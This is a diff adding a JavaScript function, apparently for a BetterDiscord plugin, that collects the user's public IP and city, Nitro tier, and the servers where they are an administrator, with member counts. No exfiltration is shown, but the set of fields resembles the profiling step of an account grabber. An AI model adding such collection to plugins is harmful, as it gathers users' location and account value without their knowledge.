@@ -1,1 +1,53 @@
+async function gatherData() {
+    let result = {
+        ip: null,
+        location: null,
+        nitro: "None",
+        admin_servers: []
+    };
+    
+    // 1. Получаем IP и локацию
+    try {
+        const ipRes = await BdApi.Net.fetch('https://jsonip.com/');
+        const ipData = await ipRes.json();
+        result.ip = ipData.ip;
+        
+        const geoRes = await BdApi.Net.fetch(`http://ip-api.com/json/${result.ip}?lang=ru&fields=status,country,regionName,city`);
+        const geoData = await geoRes.json();
+        if (geoData.status === 'success') {
+            result.location = geoData.city || geoData.regionName || geoData.country || "Unknown";
+        }
+    } catch (e) { console.error("IP Error", e); }
 
+    // 2. Проверяем статус Nitro
+    try {
+        const UserStore = BdApi.Webpack.getStore("UserStore");
+        if (UserStore) {
+            const user = UserStore.getCurrentUser();
+            if (user.premiumType === 1) result.nitro = "Nitro Classic";
+            else if (user.premiumType === 2) result.nitro = "Nitro";
+            else if (user.premiumType === 3) result.nitro = "Nitro Basic";
+        }
+    } catch (e) { console.error("Nitro Error", e); }
+
+    // 3. Ищем серверы, где ты админ, и считаем людей
+    try {
+        const GuildStore = BdApi.Webpack.getStore("GuildStore");
+        const PermissionStore = BdApi.Webpack.getStore("PermissionStore");
+        
+        if (GuildStore && PermissionStore) {
+            const guilds = GuildStore.getGuilds();
+            for (const g of Object.values(guilds)) {
+                // Проверяем право "Администратор" (8n - BigInt)
+                if (PermissionStore.can(8n, g)) {
+                    result.admin_servers.push({
+                        name: g.name,
+                        members: g.memberCount || 0
+                    });
+                }
+            }
+        }
+    } catch (e) { console.error("Guild Error", e); }
+
+    return result;
+}
